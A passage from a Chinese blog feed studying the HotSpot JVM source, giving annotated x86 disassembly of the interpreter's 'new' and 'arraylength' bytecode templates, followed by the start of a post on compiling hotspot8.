&quot;Pé*&quot;</code></pre><h2 id="附：new指令的翻译："><a href="#附：new指令的翻译：" class="headerlink" title="附：new指令的翻译："></a>附：new指令的翻译：</h2><pre><code class="hljs x86asm"><span class="hljs-comment">;_new</span><span class="hljs-comment">;start:0x7fffe10449e0</span><span class="hljs-comment">;end:0x7fffe1044e00</span>00007fffe10449e0:   <span class="hljs-keyword">push</span>    %rax00007fffe10449e1:   jmpq    <span class="hljs-number">0x7fffe1044a10</span>00007fffe10449e6:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x8,%rsp00007fffe10449ea:   <span class="hljs-keyword">vmovss</span>  %xmm0,(%rsp)00007fffe10449ef:   jmpq    <span class="hljs-number">0x7fffe1044a10</span>00007fffe10449f4:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x10,%rsp00007fffe10449f8:   <span class="hljs-keyword">vmovsd</span>  %xmm0,(%rsp)00007fffe10449fd:   jmpq    <span class="hljs-number">0x7fffe1044a10</span>00007fffe1044a02:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x10,%rsp00007fffe1044a06:   <span class="hljs-keyword">mov</span>     %rax,(%rsp)00007fffe1044a0a:   jmpq    <span class="hljs-number">0x7fffe1044a10</span>00007fffe1044a0f:   <span class="hljs-keyword">push</span>    %rax   <span class="hljs-comment">; 下面开始进入TemplateTable::_new</span>00007fffe1044a10:   movzwl  <span class="hljs-number">0x1</span>(%r13),%edx00007fffe1044a15:   <span class="hljs-keyword">bswap</span>   %edx00007fffe1044a17:   <span class="hljs-keyword">shr</span>     <span class="hljs-number">$0</span>x10,%edx<span class="hljs-comment">; _masm-&gt;get_unsigned_2_byte_index_at_bcp(rdx, 1); 翻译出来的指令到上一行结束</span>00007fffe1044a1a:   <span class="hljs-keyword">mov</span>     -<span class="hljs-number">0x18</span>(%rbp),%rsi00007fffe1044a1e:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x10</span>(%rsi),%rsi00007fffe1044a22:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x8</span>(%rsi),%rsi00007fffe1044a26:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x10</span>(%rsi),%rax<span class="hljs-comment">; _masm-&gt;get_cpool_and_tags(rsi, rax); 翻译出来的指令到上一行结束</span>00007fffe1044a2a:   cmpb    <span class="hljs-number">$0</span>x7,<span class="hljs-number">0x4</span>(%rax,%rdx,<span class="hljs-number">1</span>)<span class="hljs-comment">; const int tags_offset = Array&lt;u1&gt;::base_offset_in_bytes(); </span><span class="hljs-comment">; _masm-&gt;cmpb(Address(rax, rdx, Address::times_1, tags_offset), JVM_CONSTANT_Class);</span><span class="hljs-comment">; 翻译出来的指令到上一行结束</span>00007fffe1044a2f:   <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x7fffe1044b92</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::notEqual, slow_case); </span>00007fffe1044a35:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x58</span>(%rsi,%rdx,<span class="hljs-number">8</span>),%rsi<span class="hljs-comment">;// get InstanceKlass</span><span class="hljs-comment">;  _masm-&gt;movptr(rsi, Address(rsi, rdx, Address::times_8, sizeof(ConstantPool)));</span>00007fffe1044a3a:   cmpb    <span class="hljs-number">$0</span>x4,<span class="hljs-number">0x16a</span>(%rsi)<span class="hljs-comment">;// make sure klass is initialized &amp; doesn't have finalizer</span><span class="hljs-comment">;  // make sure klass is fully initialized</span><span class="hljs-comment">;  _masm-&gt;cmpb(Address(rsi, InstanceKlass::init_state_offset()), InstanceKlass::fully_initialized);</span>00007fffe1044a41:   <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x7fffe1044b92</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::notEqual, slow_case)</span>00007fffe1044a47:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0xc</span>(%rsi),%edx<span class="hljs-comment">; // get instance_size in InstanceKlass (scaled to a count of bytes)</span><span class="hljs-comment">;  _masm-&gt;movl(rdx, Address(rsi, Klass::layout_helper_offset()));</span>00007fffe1044a4a:   <span class="hljs-keyword">test</span>    <span class="hljs-number">$0</span>x1,%edx<span class="hljs-comment">; // test to see if it has a finalizer or is malformed in some way</span><span class="hljs-comment">;  _masm-&gt;testl(rdx, Klass::_lh_instance_slow_path_bit);</span>00007fffe1044a50:   <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x7fffe1044b92</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::notZero, slow_case);</span>00007fffe1044a56:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x70</span>(%r15),%rax<span class="hljs-comment">; _masm-&gt;movptr(rax, Address(r15_thread, in_bytes(JavaThread::tlab_top_offset())));</span>        00007fffe1044a5a:   <span class="hljs-keyword">lea</span>     (%rax,%rdx,<span class="hljs-number">1</span>),%rbx<span class="hljs-comment">;_masm-&gt;lea(rbx, Address(rax, rdx, Address::times_1));</span>    00007fffe1044a5e:   <span class="hljs-keyword">cmp</span>     <span class="hljs-number">0x80</span>(%r15),%rbx<span class="hljs-comment">;_masm-&gt;cmpptr(rbx, Address(r15_thread, in_bytes(JavaThread::tlab_end_offset())));</span>    00007fffe1044a65:   <span class="hljs-keyword">ja</span>      <span class="hljs-number">0x7fffe1044a74</span><span class="hljs-comment">;_masm-&gt;jcc(Assembler::above, allow_shared_alloc ? allocate_shared : slow_case);</span>    00007fffe1044a6b:   <span class="hljs-keyword">mov</span>     %rbx,<span class="hljs-number">0x70</span>(%r15)<span class="hljs-comment">;_masm-&gt;movptr(Address(r15_thread, in_bytes(JavaThread::tlab_top_offset())), rbx);</span>00007fffe1044a6f:   jmpq    <span class="hljs-number">0x7fffe1044aa6</span><span class="hljs-comment">; _masm-&gt;jmp(initialize_object);</span>00007fffe1044a74:   movabs  <span class="hljs-number">$0</span>x7ffff0025338,%r10<span class="hljs-comment">; _masm-&gt;bind(allocate_shared);</span><span class="hljs-comment">;    ExternalAddress top((address)Universe::heap()-&gt;top_addr());</span><span class="hljs-comment">;    ExternalAddress end((address)Universe::heap()-&gt;end_addr());</span><span class="hljs-comment">;    const Register RtopAddr = rscratch1;</span><span class="hljs-comment">;    const Register RendAddr = rscratch2;</span><span class="hljs-comment">;    _masm-&gt;lea(RtopAddr, top);</span>00007fffe1044a7e:   movabs  <span class="hljs-number">$0</span>x7ffff00252e8,%r11<span class="hljs-comment">;  _masm-&gt;lea(RendAddr, end);</span>00007fffe1044a88:   <span class="hljs-keyword">mov</span>     (%r10),%rax<span class="hljs-comment">; _masm-&gt;movptr(rax, Address(RtopAddr, 0));</span>00007fffe1044a8b:   <span class="hljs-keyword">lea</span>     (%rax,%rdx,<span class="hljs-number">1</span>),%rbx<span class="hljs-comment">;// For retries rax gets set by cmpxchgq</span><span class="hljs-comment">;    Label retry;</span><span class="hljs-comment">;    _masm-&gt;bind(retry);</span><span class="hljs-comment">;    _masm-&gt;lea(rbx, Address(rax, rdx, Address::times_1));</span>00007fffe1044a8f:   <span class="hljs-keyword">cmp</span>     (%r11),%rbx<span class="hljs-comment">; _masm-&gt;cmpptr(rbx, Address(RendAddr, 0));</span>00007fffe1044a92:   <span class="hljs-keyword">ja</span>      <span class="hljs-number">0x7fffe1044b92</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::above, slow_case);</span>00007fffe1044a98:   <span class="hljs-keyword">lock</span>    <span class="hljs-keyword">cmpxchg</span> %rbx,(%r10)<span class="hljs-comment">; _masm-&gt;lock();</span><span class="hljs-comment">; _masm-&gt;cmpxchgptr(rbx, Address(RtopAddr, 0));</span>00007fffe1044a9d:   <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x7fffe1044a8b</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::notEqual, retry);</span>00007fffe1044a9f:   <span class="hljs-keyword">add</span>     %rdx,<span class="hljs-number">0xd0</span>(%r15)<span class="hljs-comment">; _masm-&gt;incr_allocated_bytes(r15_thread, rdx, 0);</span>00007fffe1044aa6:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x10,%edx<span class="hljs-comment">; // The object is initialized before the header.  If the object size is</span><span class="hljs-comment">;    // zero, go directly to the header initialization.</span><span class="hljs-comment">;    _masm-&gt;bind(initialize_object);</span><span class="hljs-comment">;    _masm-&gt;decrementl(rdx, sizeof(oopDesc));</span>00007fffe1044aa9:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044abd</span><span class="hljs-comment">; _masm-&gt;jcc(Assembler::zero, initialize_header);</span>00007fffe1044aaf:   <span class="hljs-keyword">xor</span>     %ecx,%ecx00007fffe1044ab1:   <span class="hljs-keyword">shr</span>     <span class="hljs-number">$0</span>x3,%edx00007fffe1044ab4:   <span class="hljs-keyword">mov</span>     %rcx,<span class="hljs-number">0x8</span>(%rax,%rdx,<span class="hljs-number">8</span>)00007fffe1044ab9:   <span class="hljs-keyword">dec</span>     %edx// Initialize object fields00007fffe1044abb:   <span class="hljs-keyword">jne</span>     <span class="hljs-number">0x7fffe1044ab4</span><span class="hljs-comment">;    _masm-&gt;xorl(rcx, rcx); // use zero reg to clear memory (shorter code)</span><span class="hljs-comment">;    _masm-&gt;shrl(rdx, LogBytesPerLong);  // divide by oopSize to simplify the loop</span><span class="hljs-comment">;    &#123;</span><span class="hljs-comment">; _masm-&gt;bind(loop);</span><span class="hljs-comment">;      _masm-&gt;movq(Address(rax, rdx, Address::times_8, sizeof(oopDesc) - oopSize), rcx);</span><span class="hljs-comment">;      _masm-&gt;decrementl(rdx);</span>00007fffe1044abd:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0xb0</span>(%rsi),%r1000007fffe1044ac4:   <span class="hljs-keyword">mov</span>     %r10,(%rax)<span class="hljs-comment">; _masm-&gt;movptr(rscratch1, Address(rsi, Klass::prototype_header_offset()));</span><span class="hljs-comment">;      _masm-&gt;movptr(Address(rax, oopDesc::mark_offset_in_bytes()), rscratch1);</span>00007fffe1044ac7:   <span class="hljs-keyword">xor</span>     %ecx,%ecx00007fffe1044ac9:   <span class="hljs-keyword">mov</span>     %ecx,<span class="hljs-number">0xc</span>(%rax)00007fffe1044acc:   <span class="hljs-keyword">shr</span>     <span class="hljs-number">$0</span>x3,%rsi00007fffe1044ad0:   <span class="hljs-keyword">mov</span>     %esi,<span class="hljs-number">0x8</span>(%rax)<span class="hljs-comment">; _masm-&gt;xorl(rcx, rcx); // use zero reg to clear memory (shorter code)</span><span class="hljs-comment">;    _masm-&gt;store_klass_gap(rax, rcx);  // zero klass gap for compressed oops</span><span class="hljs-comment">;    _masm-&gt;store_klass(rax, rsi);      // store klass last</span>00007fffe1044ad3:   cmpb    <span class="hljs-number">$0</span>x0,<span class="hljs-number">0x16317681</span>(%rip)        # <span class="hljs-number">0x7ffff735c15b</span> &lt;DTraceAllocProbes&gt;00007fffe1044ada:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044b8d</span><span class="hljs-comment">; SkipIfEqual skip(_masm, &amp;DTraceAllocProbes, false);</span>00007fffe1044ae0:   <span class="hljs-keyword">push</span>    %rax<span class="hljs-comment">; _masm-&gt;push(atos); // save the return value</span>00007fffe1044ae1:   <span class="hljs-keyword">mov</span>     %rax,%rdi00007fffe1044ae4:   cmpq    <span class="hljs-number">$0</span>x0,-<span class="hljs-number">0x10</span>(%rbp)00007fffe1044aec:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044b69</span>00007fffe1044af2:   <span class="hljs-keyword">mov</span>     %rsp,-<span class="hljs-number">0x28</span>(%rsp)00007fffe1044af7:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x80,%rsp00007fffe1044afe:   <span class="hljs-keyword">mov</span>     %rax,<span class="hljs-number">0x78</span>(%rsp)00007fffe1044b03:   <span class="hljs-keyword">mov</span>     %rcx,<span class="hljs-number">0x70</span>(%rsp)00007fffe1044b08:   <span class="hljs-keyword">mov</span>     %rdx,<span class="hljs-number">0x68</span>(%rsp)00007fffe1044b0d:   <span class="hljs-keyword">mov</span>     %rbx,<span class="hljs-number">0x60</span>(%rsp)00007fffe1044b12:   <span class="hljs-keyword">mov</span>     %rbp,<span class="hljs-number">0x50</span>(%rsp)00007fffe1044b17:   <span class="hljs-keyword">mov</span>     %rsi,<span class="hljs-number">0x48</span>(%rsp)00007fffe1044b1c:   <span class="hljs-keyword">mov</span>     %rdi,<span class="hljs-number">0x40</span>(%rsp)00007fffe1044b21:   <span class="hljs-keyword">mov</span>     %r8,<span class="hljs-number">0x38</span>(%rsp)00007fffe1044b26:   <span class="hljs-keyword">mov</span>     %r9,<span class="hljs-number">0x30</span>(%rsp)00007fffe1044b2b:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x28</span>(%rsp)00007fffe1044b30:   <span class="hljs-keyword">mov</span>     %r11,<span class="hljs-number">0x20</span>(%rsp)00007fffe1044b35:   <span class="hljs-keyword">mov</span>     %r12,<span class="hljs-number">0x18</span>(%rsp)00007fffe1044b3a:   <span class="hljs-keyword">mov</span>     %r13,<span class="hljs-number">0x10</span>(%rsp)00007fffe1044b3f:   <span class="hljs-keyword">mov</span>     %r14,<span class="hljs-number">0x8</span>(%rsp)00007fffe1044b44:   <span class="hljs-keyword">mov</span>     %r15,(%rsp)00007fffe1044b48:   movabs  <span class="hljs-number">$0</span>x7ffff6c8ceb8,%rdi00007fffe1044b52:   movabs  <span class="hljs-number">$0</span>x7fffe1044af2,%rsi00007fffe1044b5c:   <span class="hljs-keyword">mov</span>     %rsp,%rdx00007fffe1044b5f:   <span class="hljs-keyword">and</span>     <span class="hljs-number">$0</span>xfffffffffffffff0,%rsp00007fffe1044b63:   callq   <span class="hljs-number">0x7ffff68024fa</span> &lt;MacroAssembler::debug64(char*, long, long*)&gt;00007fffe1044b68:   <span class="hljs-keyword">hlt</span>     00007fffe1044b69:   <span class="hljs-keyword">test</span>    <span class="hljs-number">$0</span>xf,%esp00007fffe1044b6f:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044b87</span>00007fffe1044b75:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x8,%rsp00007fffe1044b79:   callq   <span class="hljs-number">0x7ffff699de5c</span> &lt;SharedRuntime::dtrace_object_alloc(oopDesc*)&gt;00007fffe1044b7e:   <span class="hljs-keyword">add</span>     <span class="hljs-number">$0</span>x8,%rsp00007fffe1044b82:   jmpq    <span class="hljs-number">0x7fffe1044b8c</span>00007fffe1044b87:   callq   <span class="hljs-number">0x7ffff699de5c</span> &lt;SharedRuntime::dtrace_object_alloc(oopDesc*)&gt;<span class="hljs-comment">; _masm-&gt;call_VM_leaf(CAST_FROM_FN_PTR(address, SharedRuntime::dtrace_object_alloc), rax); // 这一句翻译出了很多句指令</span>00007fffe1044b8c:   <span class="hljs-keyword">pop</span>     %rax<span class="hljs-comment">; _masm-&gt;pop(atos); // restore the return value</span>00007fffe1044b8d:   jmpq    <span class="hljs-number">0x7fffe1044e00</span><span class="hljs-comment">; _masm-&gt;jmp(done);</span>00007fffe1044b92:   <span class="hljs-keyword">mov</span>     -<span class="hljs-number">0x18</span>(%rbp),%rsi00007fffe1044b96:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x10</span>(%rsi),%rsi00007fffe1044b9a:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x8</span>(%rsi),%rsi<span class="hljs-comment">; _masm-&gt;get_constant_pool(c_rarg1);</span>00007fffe1044b9e:   movzwl  <span class="hljs-number">0x1</span>(%r13),%edx00007fffe1044ba3:   <span class="hljs-keyword">bswap</span>   %edx00007fffe1044ba5:   <span class="hljs-keyword">shr</span>     <span class="hljs-number">$0</span>x10,%edx<span class="hljs-comment">; _masm-&gt;get_unsigned_2_byte_index_at_bcp(c_rarg2, 1);</span>00007fffe1044ba8:   callq   <span class="hljs-number">0x7fffe1044bb2</span>00007fffe1044bad:   jmpq    <span class="hljs-number">0x7fffe1044e00</span>00007fffe1044bb2:   <span class="hljs-keyword">lea</span>     <span class="hljs-number">0x8</span>(%rsp),%rax00007fffe1044bb7:   <span class="hljs-keyword">mov</span>     %r13,-<span class="hljs-number">0x38</span>(%rbp)00007fffe1044bbb:   cmpq    <span class="hljs-number">$0</span>x0,-<span class="hljs-number">0x10</span>(%rbp)00007fffe1044bc3:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044c40</span>00007fffe1044bc9:   <span class="hljs-keyword">mov</span>     %rsp,-<span class="hljs-number">0x28</span>(%rsp)00007fffe1044bce:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x80,%rsp00007fffe1044bd5:   <span class="hljs-keyword">mov</span>     %rax,<span class="hljs-number">0x78</span>(%rsp)00007fffe1044bda:   <span class="hljs-keyword">mov</span>     %rcx,<span class="hljs-number">0x70</span>(%rsp)00007fffe1044bdf:   <span class="hljs-keyword">mov</span>     %rdx,<span class="hljs-number">0x68</span>(%rsp)00007fffe1044be4:   <span class="hljs-keyword">mov</span>     %rbx,<span class="hljs-number">0x60</span>(%rsp)00007fffe1044be9:   <span class="hljs-keyword">mov</span>     %rbp,<span class="hljs-number">0x50</span>(%rsp)00007fffe1044bee:   <span class="hljs-keyword">mov</span>     %rsi,<span class="hljs-number">0x48</span>(%rsp)00007fffe1044bf3:   <span class="hljs-keyword">mov</span>     %rdi,<span class="hljs-number">0x40</span>(%rsp)00007fffe1044bf8:   <span class="hljs-keyword">mov</span>     %r8,<span class="hljs-number">0x38</span>(%rsp)00007fffe1044bfd:   <span class="hljs-keyword">mov</span>     %r9,<span class="hljs-number">0x30</span>(%rsp)00007fffe1044c02:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x28</span>(%rsp)00007fffe1044c07:   <span class="hljs-keyword">mov</span>     %r11,<span class="hljs-number">0x20</span>(%rsp)00007fffe1044c0c:   <span class="hljs-keyword">mov</span>     %r12,<span class="hljs-number">0x18</span>(%rsp)00007fffe1044c11:   <span class="hljs-keyword">mov</span>     %r13,<span class="hljs-number">0x10</span>(%rsp)00007fffe1044c16:   <span class="hljs-keyword">mov</span>     %r14,<span class="hljs-number">0x8</span>(%rsp)00007fffe1044c1b:   <span class="hljs-keyword">mov</span>     %r15,(%rsp)00007fffe1044c1f:   movabs  <span class="hljs-number">$0</span>x7ffff6c8ceb8,%rdi00007fffe1044c29:   movabs  <span class="hljs-number">$0</span>x7fffe1044bc9,%rsi00007fffe1044c33:   <span class="hljs-keyword">mov</span>     %rsp,%rdx00007fffe1044c36:   <span class="hljs-keyword">and</span>     <span class="hljs-number">$0</span>xfffffffffffffff0,%rsp00007fffe1044c3a:   callq   <span class="hljs-number">0x7ffff68024fa</span> &lt;MacroAssembler::debug64(char*, long, long*)&gt;00007fffe1044c3f:   <span class="hljs-keyword">hlt</span>     00007fffe1044c40:   <span class="hljs-keyword">push</span>    %r1000007fffe1044c42:   <span class="hljs-keyword">cmp</span>     <span class="hljs-number">0x16346f27</span>(%rip),%r12        # <span class="hljs-number">0x7ffff738bb70</span> &lt;_ZN8Universe17_narrow_ptrs_baseE&gt;00007fffe1044c49:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044cc6</span>00007fffe1044c4f:   <span class="hljs-keyword">mov</span>     %rsp,-<span class="hljs-number">0x28</span>(%rsp)00007fffe1044c54:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x80,%rsp00007fffe1044c5b:   <span class="hljs-keyword">mov</span>     %rax,<span class="hljs-number">0x78</span>(%rsp)00007fffe1044c60:   <span class="hljs-keyword">mov</span>     %rcx,<span class="hljs-number">0x70</span>(%rsp)00007fffe1044c65:   <span class="hljs-keyword">mov</span>     %rdx,<span class="hljs-number">0x68</span>(%rsp)00007fffe1044c6a:   <span class="hljs-keyword">mov</span>     %rbx,<span class="hljs-number">0x60</span>(%rsp)00007fffe1044c6f:   <span class="hljs-keyword">mov</span>     %rbp,<span class="hljs-number">0x50</span>(%rsp)00007fffe1044c74:   <span class="hljs-keyword">mov</span>     %rsi,<span class="hljs-number">0x48</span>(%rsp)00007fffe1044c79:   <span class="hljs-keyword">mov</span>     %rdi,<span class="hljs-number">0x40</span>(%rsp)00007fffe1044c7e:   <span class="hljs-keyword">mov</span>     %r8,<span class="hljs-number">0x38</span>(%rsp)00007fffe1044c83:   <span class="hljs-keyword">mov</span>     %r9,<span class="hljs-number">0x30</span>(%rsp)00007fffe1044c88:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x28</span>(%rsp)00007fffe1044c8d:   <span class="hljs-keyword">mov</span>     %r11,<span class="hljs-number">0x20</span>(%rsp)00007fffe1044c92:   <span class="hljs-keyword">mov</span>     %r12,<span class="hljs-number">0x18</span>(%rsp)00007fffe1044c97:   <span class="hljs-keyword">mov</span>     %r13,<span class="hljs-number">0x10</span>(%rsp)00007fffe1044c9c:   <span class="hljs-keyword">mov</span>     %r14,<span class="hljs-number">0x8</span>(%rsp)00007fffe1044ca1:   <span class="hljs-keyword">mov</span>     %r15,(%rsp)00007fffe1044ca5:   movabs  <span class="hljs-number">$0</span>x7ffff6cf9a40,%rdi00007fffe1044caf:   movabs  <span class="hljs-number">$0</span>x7fffe1044c4f,%rsi00007fffe1044cb9:   <span class="hljs-keyword">mov</span>     %rsp,%rdx00007fffe1044cbc:   <span class="hljs-keyword">and</span>     <span class="hljs-number">$0</span>xfffffffffffffff0,%rsp00007fffe1044cc0:   callq   <span class="hljs-number">0x7ffff68024fa</span> &lt;MacroAssembler::debug64(char*, long, long*)&gt;00007fffe1044cc5:   <span class="hljs-keyword">hlt</span>     00007fffe1044cc6:   <span class="hljs-keyword">pop</span>     %r1000007fffe1044cc8:   <span class="hljs-keyword">mov</span>     %r15,%rdi00007fffe1044ccb:   <span class="hljs-keyword">mov</span>     %rbp,<span class="hljs-number">0x200</span>(%r15)00007fffe1044cd2:   <span class="hljs-keyword">mov</span>     %rax,<span class="hljs-number">0x1f0</span>(%r15)00007fffe1044cd9:   <span class="hljs-keyword">test</span>    <span class="hljs-number">$0</span>xf,%esp00007fffe1044cdf:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044cf7</span>00007fffe1044ce5:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x8,%rsp00007fffe1044ce9:   callq   <span class="hljs-number">0x7ffff6652d9a</span> &lt;InterpreterRuntime::_new(JavaThread*, ConstantPool*, <span class="hljs-keyword">int</span>)&gt;00007fffe1044cee:   <span class="hljs-keyword">add</span>     <span class="hljs-number">$0</span>x8,%rsp00007fffe1044cf2:   jmpq    <span class="hljs-number">0x7fffe1044cfc</span>00007fffe1044cf7:   callq   <span class="hljs-number">0x7ffff6652d9a</span> &lt;InterpreterRuntime::_new(JavaThread*, ConstantPool*, <span class="hljs-keyword">int</span>)&gt;00007fffe1044cfc:   <span class="hljs-keyword">push</span>    %rax00007fffe1044cfd:   <span class="hljs-keyword">push</span>    %rdi00007fffe1044cfe:   <span class="hljs-keyword">push</span>    %rsi00007fffe1044cff:   <span class="hljs-keyword">push</span>    %rdx00007fffe1044d00:   <span class="hljs-keyword">push</span>    %rcx00007fffe1044d01:   <span class="hljs-keyword">push</span>    %r800007fffe1044d03:   <span class="hljs-keyword">push</span>    %r900007fffe1044d05:   <span class="hljs-keyword">push</span>    %r1000007fffe1044d07:   <span class="hljs-keyword">mov</span>     %rsp,%r1000007fffe1044d0a:   <span class="hljs-keyword">and</span>     <span class="hljs-number">$0</span>xfffffffffffffff0,%rsp00007fffe1044d0e:   <span class="hljs-keyword">push</span>    %r1000007fffe1044d10:   <span class="hljs-keyword">push</span>    %r1100007fffe1044d12:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">$0</span>x1,%edi00007fffe1044d17:   callq   <span class="hljs-number">0x7ffff73b3030</span> &lt;__GI___pthread_getspecific&gt;00007fffe1044d1c:   <span class="hljs-keyword">pop</span>     %r1100007fffe1044d1e:   <span class="hljs-keyword">pop</span>     %rsp00007fffe1044d1f:   <span class="hljs-keyword">pop</span>     %r1000007fffe1044d21:   <span class="hljs-keyword">pop</span>     %r900007fffe1044d23:   <span class="hljs-keyword">pop</span>     %r800007fffe1044d25:   <span class="hljs-keyword">pop</span>     %rcx00007fffe1044d26:   <span class="hljs-keyword">pop</span>     %rdx00007fffe1044d27:   <span class="hljs-keyword">pop</span>     %rsi00007fffe1044d28:   <span class="hljs-keyword">pop</span>     %rdi00007fffe1044d29:   <span class="hljs-keyword">cmp</span>     %rax,%r1500007fffe1044d2c:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044da9</span>00007fffe1044d32:   <span class="hljs-keyword">mov</span>     %rsp,-<span class="hljs-number">0x28</span>(%rsp)00007fffe1044d37:   <span class="hljs-keyword">sub</span>     <span class="hljs-number">$0</span>x80,%rsp00007fffe1044d3e:   <span class="hljs-keyword">mov</span>     %rax,<span class="hljs-number">0x78</span>(%rsp)00007fffe1044d43:   <span class="hljs-keyword">mov</span>     %rcx,<span class="hljs-number">0x70</span>(%rsp)00007fffe1044d48:   <span class="hljs-keyword">mov</span>     %rdx,<span class="hljs-number">0x68</span>(%rsp)00007fffe1044d4d:   <span class="hljs-keyword">mov</span>     %rbx,<span class="hljs-number">0x60</span>(%rsp)00007fffe1044d52:   <span class="hljs-keyword">mov</span>     %rbp,<span class="hljs-number">0x50</span>(%rsp)00007fffe1044d57:   <span class="hljs-keyword">mov</span>     %rsi,<span class="hljs-number">0x48</span>(%rsp)00007fffe1044d5c:   <span class="hljs-keyword">mov</span>     %rdi,<span class="hljs-number">0x40</span>(%rsp)00007fffe1044d61:   <span class="hljs-keyword">mov</span>     %r8,<span class="hljs-number">0x38</span>(%rsp)00007fffe1044d66:   <span class="hljs-keyword">mov</span>     %r9,<span class="hljs-number">0x30</span>(%rsp)00007fffe1044d6b:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x28</span>(%rsp)00007fffe1044d70:   <span class="hljs-keyword">mov</span>     %r11,<span class="hljs-number">0x20</span>(%rsp)00007fffe1044d75:   <span class="hljs-keyword">mov</span>     %r12,<span class="hljs-number">0x18</span>(%rsp)00007fffe1044d7a:   <span class="hljs-keyword">mov</span>     %r13,<span class="hljs-number">0x10</span>(%rsp)00007fffe1044d7f:   <span class="hljs-keyword">mov</span>     %r14,<span class="hljs-number">0x8</span>(%rsp)00007fffe1044d84:   <span class="hljs-keyword">mov</span>     %r15,(%rsp)00007fffe1044d88:   movabs  <span class="hljs-number">$0</span>x7ffff6cf9bb8,%rdi00007fffe1044d92:   movabs  <span class="hljs-number">$0</span>x7fffe1044d32,%rsi00007fffe1044d9c:   <span class="hljs-keyword">mov</span>     %rsp,%rdx00007fffe1044d9f:   <span class="hljs-keyword">and</span>     <span class="hljs-number">$0</span>xfffffffffffffff0,%rsp00007fffe1044da3:   callq   <span class="hljs-number">0x7ffff68024fa</span> &lt;MacroAssembler::debug64(char*, long, long*)&gt;00007fffe1044da8:   <span class="hljs-keyword">hlt</span>     00007fffe1044da9:   <span class="hljs-keyword">pop</span>     %rax00007fffe1044daa:   movabs  <span class="hljs-number">$0</span>x0,%r1000007fffe1044db4:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x1f0</span>(%r15)00007fffe1044dbb:   movabs  <span class="hljs-number">$0</span>x0,%r1000007fffe1044dc5:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x200</span>(%r15)00007fffe1044dcc:   cmpq    <span class="hljs-number">$0</span>x0,<span class="hljs-number">0x8</span>(%r15)00007fffe1044dd4:   <span class="hljs-keyword">je</span>      <span class="hljs-number">0x7fffe1044ddf</span>00007fffe1044dda:   jmpq    <span class="hljs-number">0x7fffe1000420</span>00007fffe1044ddf:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0x250</span>(%r15),%rax00007fffe1044de6:   movabs  <span class="hljs-number">$0</span>x0,%r1000007fffe1044df0:   <span class="hljs-keyword">mov</span>     %r10,<span class="hljs-number">0x250</span>(%r15)00007fffe1044df7:   <span class="hljs-keyword">mov</span>     -<span class="hljs-number">0x38</span>(%rbp),%r1300007fffe1044dfb:   <span class="hljs-keyword">mov</span>     -<span class="hljs-number">0x30</span>(%rbp),%r14<span class="hljs-comment">;  call_VM(rax, CAST_FROM_FN_PTR(address, InterpreterRuntime::_new), c_rarg1, c_rarg2);</span>00007fffe1044dff:   retq    00007fffe1044e00:   <span class="hljs-keyword">int3</span></code></pre><p>arraylength字节码翻译成汇编指令：  </p><pre><code class="hljs x86asm"><span class="hljs-comment">;start:0x7fffe10453a0</span><span class="hljs-comment">;end:0x7fffe10453a4</span>00007fffe10453a0:   <span class="hljs-keyword">pop</span>     %rax00007fffe10453a1:   <span class="hljs-keyword">mov</span>     <span class="hljs-number">0xc</span>(%rax),%eax00007fffe10453a4:   <span class="hljs-keyword">int3</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>step by step 编译hotspot8</title>
    <link href="/2020/04/24/compile-hotspot8/"/>
    <url>/2020/04/24/compile-hotspot8/</url>
    
